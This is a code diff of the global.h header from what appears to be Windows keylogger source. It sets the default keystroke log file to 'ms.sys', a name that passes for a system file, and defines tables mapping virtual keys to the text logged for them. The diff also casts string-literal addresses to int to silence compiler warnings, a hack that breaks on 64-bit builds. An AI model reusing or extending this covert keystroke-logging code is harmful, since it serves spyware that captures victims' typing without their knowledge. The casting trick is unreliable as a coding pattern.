@@ -28,7 +28,6 @@
 
 #ifndef GLOBAL_H
 #define GLOBAL_H
-
 //------------------------------------------------------------------- CONSTANTS
 // Name of the default log file
 #define DEFAULT_LOG_FILE_NAME "ms.sys"
@@ -61,8 +60,20 @@
 #define VK_9 0x39
 
 //------------------------------------------------------------ GLOBAL VARIABLES
+/*
+* Remark :
+*  Here, arrays containing (char *) values are transformed in arrays containing
+*  pointers of these values. 
+*  So, these pointers point at the beggining of each values.
+*  This is done this way in order to have no warning at compilation time.
+*  The arrays concerned by this hack are :
+*    - VKS_ALTER_STREAM_TXT
+*    - VKS_MATH_TXT
+*    - VKS_OTHERS_TXT
+*/
+
 // Virtual keys that alter the text stream
-static int VKS_ALTER_STREAM [ NB_VKS_ALTER_STREAM ] = { 
+static const int VKS_ALTER_STREAM [ NB_VKS_ALTER_STREAM ] = { 
 	VK_BACK, 
 	VK_TAB, 
 	VK_RETURN, 
@@ -71,16 +82,16 @@ static int VKS_ALTER_STREAM [ NB_VKS_ALTER_STREAM ] = {
 };
 	
 // Text to use in order to log the keys just above
-static char * VKS_ALTER_STREAM_TXT [ NB_VKS_ALTER_STREAM ] = { 
-	"<BACKSPACE>", 
-	"<TAB>", 
-	"<ENTER>", 
-	"<INSERT>", 
-	"<DEL>" 
+static const int VKS_ALTER_STREAM_TXT [ NB_VKS_ALTER_STREAM ] = { 
+	( int ) &"<BACKSPACE>", 
+	( int ) &"<TAB>", 
+	( int ) &"<ENTER>", 
+	( int ) &"<INSERT>", 
+	( int ) &"<DEL>" 
 };
 
 // Virtual keys that represent mathematical operators
-static int VKS_MATH [ NB_VKS_MATH ] = { 	
+static const int VKS_MATH [ NB_VKS_MATH ] = { 	
 	VK_MULTIPLY, 
 	VK_ADD, VK_OEM_PLUS, 
 	VK_SUBTRACT, VK_OEM_MINUS, 
@@ -90,23 +101,23 @@ static int VKS_MATH [ NB_VKS_MATH ] = {
 };
 
 // Text to use in order to log the keys just above
-static char * VKS_MATH_TXT [ NB_VKS_MATH ] = { 
-	"*", 
-	"+", "+", 
-	"-", "-", 
-	".", ".", 
-	"/", 
-	"<ENTER>"
+static const int VKS_MATH_TXT [ NB_VKS_MATH ] = { 
+	( int ) &"*", 
+	( int ) &"+", ( int ) &"+", 
+	( int ) &"-", ( int ) &"-", 
+	( int ) &".", ( int ) &".", 
+	( int ) &"/", 
+	( int ) &"<ENTER>"
 };
 
 // Others virtual keys that are also considered important
-static int VKS_OTHERS [ NB_VKS_OTHERS ] = { 	
+static const int VKS_OTHERS [ NB_VKS_OTHERS ] = { 	
 	VK_SPACE
 };
 
 // Text to use in order to log the keys just above
-static char * VKS_OTHERS_TXT [ NB_VKS_OTHERS ] = { 
-	" "
+static const int VKS_OTHERS_TXT [ NB_VKS_OTHERS ] = { 
+	( int ) &" "
 };
 	
 #endif /* GLOBAL_H */
